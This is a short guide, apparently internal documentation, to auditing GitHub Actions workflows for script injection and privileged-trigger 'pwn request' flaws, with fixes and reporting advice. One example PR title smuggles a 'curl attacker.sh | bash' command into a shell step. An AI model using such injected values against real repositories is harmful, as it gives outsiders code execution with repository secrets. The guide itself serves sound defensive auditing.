# Auditing GitHub Actions Workflows

CI is code that runs with secrets. When a workflow trusts something an outsider controls — a PR
title, a fork's code, a branch name — that trust can turn into code execution with the repo's
tokens. These bugs are found by reading `.github/workflows/` and are entirely account-free.

## The two main classes

### 1. Script injection

Untrusted event data interpolated straight into a `run:` block:

```yaml
- run: echo "Building ${{ github.event.pull_request.title }}"
```

An attacker sets the PR title to `"; curl attacker.sh | bash #` and the expression is expanded
into the shell before the script runs. The tainted fields to grep for: `pull_request.title`,
`pull_request.body`, `pull_request.head.ref`, `issue.title`, `issue.body`, `comment.body`,
`review.body`, `head_commit.message`.

**Fix pattern:** pass the value through an `env:` var and reference `"$PR_TITLE"` in the script —
the shell never sees the raw expression.

### 2. Pwn requests

`pull_request_target` and `workflow_run` run in the **base** repo's context: they have the repo
secrets and a write token. If such a workflow **checks out and executes the PR's code**
(`ref: ${{ github.event.pull_request.head.sha }}` then build/test/lint), a fork PR runs
attacker code with those secrets.

**Safe patterns:** don't check out untrusted code under a privileged trigger; gate on membership
before doing anything sensitive; keep `permissions:` minimal; use an approval gate for external
contributors.

## How to work an org

1. Search the org for `pull_request_target` and `workflow_run` in `.github/workflows`.
2. Search for tainted `github.event.*` fields used in `run:`.
3. For each hit, read the workflow: does it run untrusted code, and does it hold secrets?
4. `tools/workflow_audit.py` does the first pass; the judgment is yours.

## Reporting

Show the trigger, the exact line that consumes untrusted input, and the secret/permission it
exposes. A privileged trigger that never touches PR code, or a tainted field that only reaches an
`env:` var, is safe — note it as a refutation rather than a finding.
